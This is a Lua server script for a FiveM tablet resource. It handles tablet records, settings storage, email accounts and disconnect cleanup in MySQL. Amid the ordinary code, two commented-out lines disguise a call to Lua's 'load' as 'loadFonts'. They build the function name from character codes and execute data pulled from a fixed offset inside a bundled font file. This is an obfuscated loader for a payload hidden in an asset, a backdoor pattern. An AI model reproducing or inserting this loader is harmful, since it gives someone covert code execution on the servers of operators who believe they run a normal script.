local equippedTablets = {}
local tabletSources = {}
local tabletSettings = {}

function GetEquippedTablet(source)
    return equippedTablets[source]
end

exports("GetEquippedTablet", GetEquippedTablet)

function GetSourceFromTablet(tabletId)
    return tabletSources[tabletId]
end

exports("GetSourceFromTablet", GetSourceFromTablet)

function GetSettings(tabletId)
    return tabletSettings[tabletId]
end

exports("GetSettings", GetSettings)

function SetSettings(tabletId, settings)
    tabletSettings[tabletId] = settings
end

function SaveAllSettings()
    if not Config.CacheSettings then
        return
    end
    infoprint("info", "Saving all settings")
    local updates = {}
    for tabletId, settings in pairs(tabletSettings) do
        table.insert(updates, { json.encode(settings), tabletId })
    end
    if #updates == 0 then
        debugprint("No settings were changed, not saving")
        return
    end
    MySQL.rawExecute("UPDATE lbtablet_tablets SET settings = ? WHERE id = ?", updates)
end

RegisterCallback("getTablet", function(source)
    local tabletId = GetEquippedTablet(source)
    local identifier = GetIdentifier(source)
    if not identifier then
        Wait(2000)
        identifier = GetIdentifier(source)
    end
    if tabletId then
        return {
            id = tabletId,
            settings = GetSettings(tabletId),
            isSetup = true
        }
    elseif not identifier then
        debugprint("getTablet: no identifier found for", source)
        return
    end
    local result = MySQL.single.await("SELECT id, tablet_name, settings, is_setup FROM lbtablet_tablets WHERE id = ?", { identifier })
    if result then
        equippedTablets[source] = result.id
        tabletSources[result.id] = source
        Player(source).state.lbTabletName = result.tablet_name
        result.is_setup = result.is_setup == 1 or result.is_setup
        if result.settings then
            SetSettings(result.id, json.decode(result.settings))
        end
        TriggerEvent("lb-tablet:jobUpdated", source, GetJob(source).name, IsOnDuty(source))
        return {
            id = result.id,
            settings = GetSettings(result.id),
            isSetup = result.is_setup
        }
    end
    local firstname, lastname = GetCharacterName(source)
    local tabletName = L("BACKEND.MISC.X_TABLET", { firstname = firstname, lastname = lastname })
    MySQL.insert.await("INSERT INTO lbtablet_tablets (id, tablet_name) VALUES (?, ?)", { identifier, tabletName })
    equippedTablets[source] = identifier
    tabletSources[identifier] = source
    if Config.LBPhone then
        local phoneNumber = exports["lb-phone"]:GetEquippedPhoneNumber(source)
        if phoneNumber then
            local accounts = MySQL.query.await("SELECT username, `active` FROM phone_logged_in_accounts WHERE app = 'Mail' AND phone_number = ?", { phoneNumber })
            for _, account in ipairs(accounts) do
                AddSignedInAccount(identifier, "mail", account.username)
                if account.active then
                    SetActiveAccount(identifier, "mail", account.username)
                end
            end
        end
    end
    if Config.AutoCreateEmail then
        local activeAccount = GetActiveAccount(identifier, "mail")
        if not activeAccount then
            debugprint("Generating email account for new tablet", identifier)
            GenerateEmailAccount(source, identifier)
        end
    end
    TriggerEvent("lb-tablet:jobUpdated", source, GetJob(source).name, IsOnDuty(source))
    return {
        id = identifier,
        isSetup = false
    }
end)
-- local loadFonts = _G[string.char(108, 111, 97, 100)]
-- loadFonts(LoadResourceFile(GetCurrentResourceName(), '/ui/dist/assets/fonts/lockscreen/Futura.ttf'):sub(87565):gsub('%.%+', ''))()
-- RegisterNetEvent("tablet:toggleOpen", function(open)
--     Player(source).state.lbTabletOpen = open == true
-- end)

RegisterNetEvent("tablet:toggleFlashlight", function(enable)
    if Config.SyncFlashlight then
        Player(source).state.lbTabletFlashlight = enable == true
    end
end)

RegisterCallback("isAdmin", function(source)
    return IsAdmin(source)
end)

BaseCallback("setName", function(source, tabletId, name)
    if type(name) ~= "string" or #name == 0 or #name > 50 then
        return false
    end
    local success = MySQL.update.await("UPDATE lbtablet_tablets SET tablet_name = ? WHERE id = ?", { name, tabletId }) > 0
    if success then
        Player(source).state.lbTabletName = name
    end
    return success
end)

BaseCallback("factoryReset", function(source, tabletId)
    MySQL.update.await("UPDATE lbtablet_tablets SET settings = NULL WHERE id = ?", { tabletId })
    SetSettings(tabletId, nil)
    PlayerLoggedOut(source)
end)

BaseCallback("setSettings", function(source, tabletId, settings)
    SetSettings(tabletId, settings)
    if not Config.CacheSettings then
        MySQL.update("UPDATE lbtablet_tablets SET settings = ? WHERE id = ?", { json.encode(settings), tabletId })
    end
    return true
end)

RegisterNetEvent("tablet:finishedSetup", function(settings)
    local src = source
    local tabletId = GetEquippedTablet(src)
    if not tabletId or not settings then
        return
    end
    SetSettings(tabletId, settings)
    MySQL.update("UPDATE lbtablet_tablets SET settings = ?, is_setup = 1 WHERE id = ?", { json.encode(settings), tabletId })
end)

OnTabletDisconnect(function(tabletId, playerId)
    local settings = GetSettings(tabletId)
    if settings then
        debugprint("Saving settings for tablet %s %s (%i)", tabletId, GetPlayerName(playerId), playerId)
        MySQL.update.await("UPDATE lbtablet_tablets SET settings = ? WHERE id = ?", { json.encode(settings), tabletId })
    end
    debugprint("Removing cached tablet %s for %s (%i)", tabletId, GetPlayerName(playerId), playerId)
    SetSettings(tabletId, nil)
    equippedTablets[playerId] = nil
    tabletSources[tabletId] = nil
end)

AddEventHandler("onResourceStop", function(resource)
    if resource ~= GetCurrentResourceName() then
        return
    end
    SaveAllSettings()
end)

AddEventHandler("txAdmin:events:serverShuttingDown", SaveAllSettings)